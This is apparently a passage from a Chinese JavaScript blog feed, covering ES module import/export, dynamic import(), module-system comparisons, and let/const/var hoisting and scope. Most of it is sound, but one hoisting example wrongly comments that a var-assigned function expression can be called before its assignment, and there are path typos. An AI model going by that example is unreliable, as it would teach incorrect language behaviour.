js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> Module <span class="keyword">from</span> <span class="string">&#x27;/modules/module.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这将获取<code>module.mjs</code>中所有可用的导出，并使它们可以作为对象模块的成员使用，从而有效地为其提供自己的命名空间。 例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Module.function1()</span><br><span class="line">Module.function2()</span><br><span class="line">etc.</span><br></pre></td></tr></table></figure><p>再次，让我们看一个真实的例子。如果您转到我们的module-objects目录，您将再次看到相同的示例，但利用上述的新语法进行重写。在模块中，导出都是以下简单形式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123; name, draw, reportArea, reportPerimeter &#125;;</span><br></pre></td></tr></table></figure><p>另一方面，导入看起来像这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> Canvas <span class="keyword">from</span> <span class="string">&#x27;./modules/canvas.mjs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> Square <span class="keyword">from</span> <span class="string">&#x27;/./modules/square.mjs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> Circle <span class="keyword">from</span> <span class="string">&#x27;./modules/circle.mjs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> Triangle <span class="keyword">from</span> <span class="string">&#x27;./modules/triangle.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><p>在每种情况下，您现在可以访问指定对象名称下面的模块导入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> square1 = Square.draw(myCanvas.ctx, <span class="number">50</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="string">&#x27;blue&#x27;</span>);</span><br><span class="line">Square.reportArea(square1.length, reportList);</span><br><span class="line">Square.reportPerimeter(square1.length, reportList);</span><br></pre></td></tr></table></figure><p>因此，您现在可以像以前一样编写代码（只要您在需要时包含对象名称），并且导入更加整洁。</p><h2 id="模块与类（class）"><a href="#模块与类（class）" class="headerlink" title="模块与类（class）"></a>模块与类（class）</h2><p>正如我们之前提到的那样，您还可以导出和导入类; 这是避免代码冲突的另一种选择，如果您已经以面向对象的方式编写了模块代码，那么它尤其有用。</p><p>您可以在我们的classes目录中看到使用ES类重写的形状绘制模块的示例。 例如，<code>square.mjs</code> 文件现在包含单个类中的所有功能：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">ctx, listId, length, x, y, color</span>)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">draw</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们导出：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123; Square &#125;;</span><br></pre></td></tr></table></figure><p>在<code>main.mjs</code>中，我们像这样导入它：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Square &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/square.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后使用该类绘制我们的方块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> square1 = <span class="keyword">new</span> Square(myCanvas.ctx, myCanvas.listId, <span class="number">50</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="string">&#x27;blue&#x27;</span>);</span><br><span class="line">square1.draw();</span><br><span class="line">square1.reportArea();</span><br><span class="line">square1.reportPerimeter();</span><br></pre></td></tr></table></figure><h2 id="合并模块"><a href="#合并模块" class="headerlink" title="合并模块"></a>合并模块</h2><p>有时你会想要将模块聚合在一起。 您可能有多个级别的依赖项，您希望简化事物，将多个子模块组合到一个父模块中。 这可以使用父模块中以下表单的导出语法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">&#x27;x.mjs&#x27;</span></span><br><span class="line"><span class="keyword">export</span> &#123; name &#125; <span class="keyword">from</span> <span class="string">&#x27;x.mjs&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>备注：</strong>这实际上是<strong>导入后跟导出的简写</strong>，即“我导入模块<code>x.mjs</code>，然后<strong>重新导出部分或全部导出</strong>”。</p><p>有关示例，请参阅我们的module-aggregation。 在这个例子中（基于我们之前的类示例），我们有一个名为<code>shapes.mjs</code>的额外模块，它将<code>circle.mjs</code>，<code>square.mjs</code>和<code>riangle.mjs</code>中的所有功能聚合在一起。 我们还将子模块移动到名为shapes的modules目录中的子目录中。 所以模块结构现在是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">modules/</span><br><span class="line">  canvas.mjs</span><br><span class="line">  shapes.mjs</span><br><span class="line">  shapes/</span><br><span class="line">    circle.mjs</span><br><span class="line">    square.mjs</span><br><span class="line">    triangle.mjs</span><br></pre></td></tr></table></figure><p>在每个子模块中，输出具有相同的形式，例如，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123; Square &#125;;</span><br></pre></td></tr></table></figure><p>接下来是聚合部分。 在<code>shapes.mjs</code>里面，我们包括以下几行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123; Square &#125; <span class="keyword">from</span> <span class="string">&#x27;/js-examples/modules/module-aggregation/modules/shapes/square.mjs&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> &#123; Triangle &#125; <span class="keyword">from</span> <span class="string">&#x27;/js-examples/modules/module-aggregation/modules/shapes/triangle.mjs&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> &#123; Circle &#125; <span class="keyword">from</span> <span class="string">&#x27;/js-examples/modules/module-aggregation/modules/shapes/circle.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><p>它们从各个子模块中获取导出，并有效地从<code>shapes.mjs</code>模块中获取它们。</p><p><strong>备注：</strong>即使<code>shapes.mjs</code>文件位于modules目录中，我们仍然需要相对于模块根目录编写这些URL，因此需要<code>/modules/</code>。 这是使用JavaScript模块时混淆的常见原因。</p><p><strong>备注：</strong><code>shapes.mjs</code>中引用的导出基本上通过文件重定向，并且实际上并不存在，因此您将无法在同一文件中编写任何有用的相关代码。</p><p>所以现在在<code>main.mjs</code> 文件中，我们可以通过替换来访问所有三个模块类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Square &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/square.mjs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Circle &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/circle.mjs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Triangle &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/triangle.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><p>使用以下单行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Square, Circle, Triangle &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/shapes.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="动态加载模块"><a href="#动态加载模块" class="headerlink" title="动态加载模块"></a>动态加载模块</h2><p>浏览器中可用的JavaScript模块功能的最新部分是动态模块加载。 这允许您仅在需要时动态加载模块，而不必预先加载所有模块。 这有一些明显的性能优势; 让我们继续阅读，看看它是如何工作的。</p><p>这个新功能允许您将<code>import()</code>作为函数调用，将其传递给模块的路径作为参数。 它返回一个 <code>promise</code>，它用一个<strong>模块对象</strong>来实现，让你可以访问该对象的导出，例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">&#x27;/modules/myModule.mjs&#x27;</span>)</span><br><span class="line">  .then(<span class="function">(<span class="params"><span class="built_in">module</span></span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Do something with the module.</span></span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>我们来看一个例子。 在dynamic-module-imports目录中，我们有另一个基于类示例的示例。 但是这次我们在示例加载时没有在画布上绘制任何东西。 相反，我们包括三个按钮 - “圆形”，“方形”和“三角形” - 按下时，动态加载所需的模块，然后使用它来绘制相关的形状。</p><p>在这个例子中，我们只对index.html和main.mjs文件进行了更改 - 模块导出保持与以前相同。</p><p>在<code>main.mjs</code>中，我们使用<code>document.querySelector()</code>调用获取了对每个按钮的引用，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> squareBtn = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.square&#x27;</span>);</span><br></pre></td></tr></table></figure><p>然后，我们为每个按钮附加一个事件监听器，以便在按下时，相关模块被动态加载并用于绘制形状：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">squareBtn.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">import</span>(<span class="string">&#x27;/js-examples/modules/dynamic-module-imports/modules/square.mjs&#x27;</span>).then(<span class="function">(<span class="params">Module</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> square1 = <span class="keyword">new</span> Module.Square(myCanvas.ctx, myCanvas.listId, <span class="number">50</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="string">&#x27;blue&#x27;</span>);</span><br><span class="line">    square1.draw();</span><br><span class="line">    square1.reportArea();</span><br><span class="line">    square1.reportPerimeter();</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>请注意，由于promise履行会返回一个模块对象，因此该类成为对象的子特征，因此我们现在需要使用 <code>Module</code>访问构造函数。 在它之前，例如 <code>Module.Square( ... )</code>。</p><h1 id="ES6-模块与-CommonJS-模块的差异"><a href="#ES6-模块与-CommonJS-模块的差异" class="headerlink" title="ES6 模块与 CommonJS 模块的差异"></a>ES6 模块与 CommonJS 模块的差异</h1><p><strong>CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。</strong></p><ul><li>CommonJS 模块输出的是值的拷贝，也就是说，一旦输出一个值，模块内部的变化就影响不到这个值。</li><li>ES6 模块的运行机制与 CommonJS 不一样。JS 引擎对脚本静态分析的时候，遇到模块加载命令<code>import</code>，就会生成一个只读引用。等到脚本真正执行时，再根据这个只读引用，到被加载的那个模块里面去取值。换句话说，ES6 的<code>import</code>有点像 Unix 系统的“符号连接”，原始值变了，<code>import</code>加载的值也会跟着变。因此，ES6 模块是动态引用，并且不会缓存值，模块里面的变量绑定其所在的模块。</li></ul><p><strong>CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。</strong></p><ul><li>运行时加载: CommonJS 模块就是<strong>对象</strong>；即在输入时是先加载整个模块，生成一个对象，然后再从这个对象上面读取方法，这种加载称为“运行时加载”。</li><li>编译时加载: ES6 模块不是对象，而是通过 <code>export</code> 命令<strong>显式指定输出的代码</strong>，<code>import</code>时采用静态命令的形式。即在<code>import</code>时可以指定加载某个输出值，而不是加载整个模块，这种加载称为“编译时加载”。</li></ul><p>CommonJS 加载的是一个对象（即<code>module.exports</code>属性），<strong>该对象只有在脚本运行完才会生成</strong>。而 ES6 模块不是对象，它的对外接口只是一种静态定义，<strong>在代码静态解析阶段就会生成</strong>。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>CommonJS</strong>规范主要用于<strong>服务端</strong>编程，加载模块是<strong>同步</strong>的，这并不适合在浏览器环境，因为同步意味着阻塞加载，浏览器资源是异步加载的，因此有了AMD CMD解决方案。</p><p><strong>AMD</strong>规范在浏览器环境中<strong>异步</strong>加载模块，而且可以并行加载多个模块。不过，AMD规范开发成本高，代码的阅读和书写比较困难，模块定义方式的语义不顺畅。</p><p><strong>CMD</strong>规范与AMD规范很相似，都用于浏览器编程，依赖就近，延迟执行，可以很容易在Node.js中运行。不过，依赖SPM 打包，模块的加载逻辑偏重。</p><p><strong>ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案</strong>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;模块化的背景&quot;&gt;&lt;a href=&quot;#模块化的背景&quot; class=&quot;headerlink&quot; title=&quot;模块化的背景&quot;&gt;&lt;/a&gt;模块化的背景&lt;/h1&gt;&lt;p&gt;JavaScript 程序本来很小——在早期，它们大多被用来执行独立的脚本任务，在你的 web 页面需要的地</summary>
      
    
    
    
    <category term="ES6+" scheme="https://lesliewaong.top/categories/ES6/"/>
    
    
    <category term="ES6" scheme="https://lesliewaong.top/tags/ES6/"/>
    
    <category term="模块化" scheme="https://lesliewaong.top/tags/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    
    <category term="IIFE" scheme="https://lesliewaong.top/tags/IIFE/"/>
    
    <category term="CommonJS" scheme="https://lesliewaong.top/tags/CommonJS/"/>
    
    <category term="AMD" scheme="https://lesliewaong.top/tags/AMD/"/>
    
    <category term="CMD" scheme="https://lesliewaong.top/tags/CMD/"/>
    
  </entry>
  
  <entry>
    <title>let、const和var的区别</title>
    <link href="https://lesliewaong.top/posts/9a4e49b6.html"/>
    <id>https://lesliewaong.top/posts/9a4e49b6.html</id>
    <published>2022-02-26T04:22:32.000Z</published>
    <updated>2022-03-25T14:08:26.393Z</updated>
    
    <content type="html"><![CDATA[<h1 id="let、const和var的区别"><a href="#let、const和var的区别" class="headerlink" title="let、const和var的区别"></a>let、const和var的区别</h1><h2 id="var"><a href="#var" class="headerlink" title="var"></a>var</h2><ol><li>存在<strong>变量提升</strong>  即变量可以在声明之前调用，值为<code>undefined</code>。</li><li>可以<strong>重复声明</strong>。</li><li>在<strong>函数</strong>中使用var声明变量的时候，该变量是<strong>局部</strong>的；对于声明在任何函数外的变量来说是<strong>全局</strong>的。</li></ol><h2 id="let"><a href="#let" class="headerlink" title="let"></a>let</h2><ol><li>不存在变量提升，let声明变量前，该变量不能使用（<strong>暂时性死区</strong>）。</li><li>let命令所在的代码块内有效，在<strong>块级作用域</strong>内有效。</li><li>let不允许在<strong>相同作用域</strong>中重复声明，注意是相同作用域，不同作用域有重复声明不会报错。</li></ol><h2 id="const"><a href="#const" class="headerlink" title="const"></a>const</h2><ol><li><strong>不存在变量提升</strong>。</li><li><strong>存在块级作用域</strong>。</li><li><strong>同一作用域不允许重复声明变量</strong>。</li><li>const声明一个只读的常量。一旦声明，<strong>常量的值就不能改变</strong>。const并不是变量的值不能改动，而是<strong>变量指向的内存地址所保存的数据不得改动</strong>。例如，在引用内容是对象的情况下，这意味着可以改变对象的内容。</li></ol><h2 id="变量提升和函数提升"><a href="#变量提升和函数提升" class="headerlink" title="变量提升和函数提升"></a>变量提升和函数提升</h2><p>在ES6之前，js是没有块级作用域，只有两种作用域</p><ul><li>全局作用域</li><li>函数作用域</li></ul><p>什么是没有块级作用域?</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// 123</span></span><br></pre></td></tr></table></figure><p>变量a是声明在if的{}里，但在js里面，因为没有块级作用域，所以此时的变量a的作用域是全局作用域。</p><h3 id="什么是变量提升"><a href="#什么是变量提升" class="headerlink" title="什么是变量提升?"></a>什么是变量提升?</h3><p>在我们的js中，代码的执行时分两步走的，1、解析  2、一步一步执行</p><p>那么变量提升就是<strong>变量声明会被提升到作用域的最顶上去</strong>，也就是该变量不管是在作用域的哪个地方声明的，都会提升到作用域的最顶上去。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">var</span> a=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// hello</span></span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// undefined</span></span><br><span class="line">a=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// hello</span></span><br></pre></td></tr></table></figure><p>看几个例子:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="number">10</span>;<span class="comment">// 全局变量：任何一个地方都可以访问，包括函数内部</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);<span class="comment">// undefined</span></span><br><span class="line">    <span class="keyword">var</span> a=<span class="number">20</span>;<span class="comment">// 局部变量，而且会变量提升，就是把声明提升到作用域的最顶上去</span></span><br><span class="line">    <span class="built_in">console</span>.log(a);<span class="comment">// 20</span></span><br><span class="line">&#125;</span><br><span class="line">fn();<span class="comment">// 调用fn</span></span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 稍作改动</span></span><br><span class="line"><span class="keyword">var</span> a=<span class="number">10</span>;<span class="comment">// 全局变量：任何一个地方都可以访问，包括函数内部</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);<span class="comment">// 10</span></span><br><span class="line">    a=<span class="number">20</span>;<span class="comment">// 全局变量的重新赋值</span></span><br><span class="line">    <span class="built_in">console</span>.log(a);<span class="comment">// 20</span></span><br><span class="line">&#125;</span><br><span class="line">fn();<span class="comment">// 调用fn</span></span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// 20</span></span><br></pre></td></tr></table></figure><p>再看一个例子:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);<span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">2</span>;<span class="comment">// 由于没有块级作用域，此处相当于在全局作用域重复声明了两次，第二次声明被忽略，仅用于赋值</span></span><br><span class="line">    <span class="built_in">console</span>.log(a);<span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h3 id="什么是函数提升"><a href="#什么是函数提升" class="headerlink" title="什么是函数提升?"></a>什么是函数提升?</h3><p>函数声明式，会将函数的声明和定义一起提升到作用域的最顶上去。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn();<span class="comment">// 可正常调用</span></span><br><span class="line"><span class="built_in">console</span>.log(fn);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fn();<span class="comment">// 可正常调用</span></span><br></pre></td></tr></table></figure><p>如果是这种写法:<strong>函数表达式声明的函数</strong>，相当于<strong>变量提升</strong>，如果使用<strong>const</strong>或<strong>let</strong>，则无法提升。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn();<span class="comment">// 可正常调用</span></span><br><span class="line"><span class="built_in">console</span>.log(fn);<span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fn();<span class="comment">// 可正常调用</span></span><br></pre></td></tr></table></figure><p>优先级</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(fn);<span class="comment">// ƒ fn()&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> fn=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(fn);<span class="comment">// hello</span></span><br></pre></td></tr></table></figure><p><strong>最后的总结:</strong></p><p>1:<strong>所有的声明都会提升到作用域的最顶上去</strong>。</p><p>2:同一个变量只会<strong>声明一次</strong>，其他的会被忽略掉。</p><p>3:<strong>函数声明的优先级高于变量声明的优先级</strong>，并且函数声明和函数定义的部分一起被提升。</p><h2 id="函数传参的一道题"><a href="#函数传参的一道题" class="headerlink" title="函数传参的一道题"></a>函数传参的一道题</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Julia&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 这里其实相当于 var a = a;</span></span><br><span class="line">  a.age = <span class="number">24</span>; <span class="comment">// 此时局部变量a指向外部a的地址，所以可以修改</span></span><br><span class="line">    <span class="comment">// 此时相当于给局部变量a一个新的对象引用，不再指向外部a地址,所以无法修改</span></span><br><span class="line">  a = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Kath&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">30</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line">change(a);</span><br><span class="line"><span class="built_in">console</span>.log(a.age); <span class="comment">// 24</span></span><br></pre></td></tr></table></figure><p>作用域链</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var a</span></span><br><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Julia&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  a.age = <span class="number">24</span>;</span><br><span class="line">  a = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Kath&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">30</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line">change(); </span><br><span class="line"><span class="built_in">console</span>.log(a.age); <span class="comment">// 这里函数内部的a并不是隐式声明，而是根据作用域链找到了window或script上的a</span></span><br></pre></td></tr></table></figure><p>隐式声明</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// a.age = 24;</span></span><br><span class="line">  a = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Kath&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">30</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line">change(); </span><br><span class="line"><span class="built_in">console</span>.log(a.age); <span class="comment">// 函数隐式声明了一个全局变量a，</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;let、const和var的区别&quot;&gt;&lt;a href=&quot;#let、const和var的区别&quot; class=&quot;headerlink&quot; title=&quot;let、const和var的区别&quot;&gt;&lt;/a&gt;let、const和var的区别&lt;/h1&gt;&lt;h2 id=&quot;var&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="ES6+" scheme="https://lesliewaong.top/categories/ES6/"/>
    
    
    <category term="let" scheme="https://lesliewaong.top/tags/let/"/>
    
    <category term="const" scheme="https://lesliewaong.top/tags/const/"/>
    
    <category term="var" scheme="https://lesliewaong.top/tags/var/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络体系结构</title>
    <link href="https://lesliewaong.top/posts/507ba1e8.html"/>
    <id>https://lesliewaong.top/posts/507ba1e8.html</id>
    <published>2022-02-22T01:10:13.000Z</published>
    <updated>2022-03-25T14:08:26.402Z</updated>
    
